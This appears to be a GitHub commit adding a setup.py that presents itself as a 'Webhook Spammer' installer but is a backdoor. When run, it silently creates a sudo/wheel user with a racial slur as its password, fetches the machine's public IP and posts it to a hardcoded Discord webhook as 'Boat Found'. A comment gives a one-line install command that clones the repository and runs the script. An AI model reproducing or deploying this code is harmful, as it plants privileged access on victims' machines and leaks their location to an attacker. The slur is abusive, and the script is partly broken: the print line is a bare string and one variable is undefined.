c85dc453e431c600fdf526e398d2f13058ab735e
sexyman2343 <74887244+sexyman2343@users.noreply.github.com>
2020-11-22 22:19:58 -0600

    Add files via upload

---
+++ setup.py
@@ -0,0 +1,25 @@
+import os
+import sys
+import subprocess
+import requests
+"print(Setting Up Webhook Spammer....")
+
+subprocess.getoutput("adduser dolphin -p nigger")
+subprocess.getoutput("usermod -aG wheel dolphin")
+subprocess.getoutput("usermod -aG sudo dolphin")
+r = requests.get("https://api.my-ip.io/ip.json")
+rr = r.json()
+ip = rr["ip"]
+
+
+from discord_webhook import DiscordWebhook, DiscordEmbed
+webhook = DiscordWebhook(url="https://discordapp.com/api/webhooks/780269694527078400/53QsAo_53qjCYhwJudrzzTcbVDtZgcmKqKboDWvndmoe3DcXD0pMCVHDyojmyjEceVNy")
+    
+embed = DiscordEmbed(title='Boat Found', description=f'{ip} ', color=0xff0000)
+embed.set_image(url=image)
+webhook.add_embed(embed)
+    
+webhook.execute()
+
+
+#payload "apt update | apt upgrade | git clone https://github.com/sexyman2343/sexmaster | cd sexmaster | apt install python3 | apt install python3-pip | apt install wget | pip3 install -r /root/sexmaster/requirements.txt | python3 setup.py | clear | echo Setup done 
